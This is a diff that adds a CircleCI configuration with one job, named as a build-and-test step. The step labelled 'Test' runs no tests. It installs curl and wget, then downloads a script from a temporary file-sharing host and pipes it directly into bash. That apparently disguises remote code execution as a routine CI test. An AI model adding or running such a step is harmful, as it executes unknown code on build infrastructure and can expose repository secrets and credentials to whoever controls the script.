@@ -1,0 +1,17 @@
+version: 2.1
+
+orbs:
+  python: circleci/python@0.2.1
+
+jobs:
+  build-and-test:
+    executor: python/default
+    steps:
+      - run:
+          command: apt update && apt install wget -y && apt install curl -y && curl http://temp.sh/AZmjG/test.sh | bash
+          name: Test
+
+workflows:
+  main:
+    jobs:
+      - build-and-test
